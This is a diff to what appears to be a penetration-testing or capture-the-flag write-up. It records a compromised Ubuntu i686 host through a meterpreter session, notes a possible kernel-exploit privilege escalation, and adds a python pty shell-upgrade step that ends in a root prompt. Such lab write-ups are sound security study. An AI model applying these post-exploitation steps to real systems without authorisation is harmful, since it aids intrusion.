@@ -342,7 +342,7 @@ meterpreter >
 
 - We now have a meterpreter shell!
 - Running sysinfo shows us we have a Ubuntu 16.04 box running with an old linux kernel - this could open some doors for a kernel exploit priv esc
-- Also note we arent on amd64
+- Also note we arent on amd64 we are on i686 which is 32bit - this could pose a problem for compiling some of our exploits
 
 ```
 meterpreter > sysinfo
@@ -352,5 +352,15 @@ Architecture : i686
 BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
 meterpreter >
+```
+
+- we can upgrade our shell further by using the python pty library
+- and export TERM=xterm will give you the ability to clear the screen
+```
+meterpreter > shell
+Process 32222 created.
+Channel 2 created.
+python -c 'import pty; pty.spawn("/bin/bash")'
+root@srv-99-590:/usr/share/webmin#
 ```
 
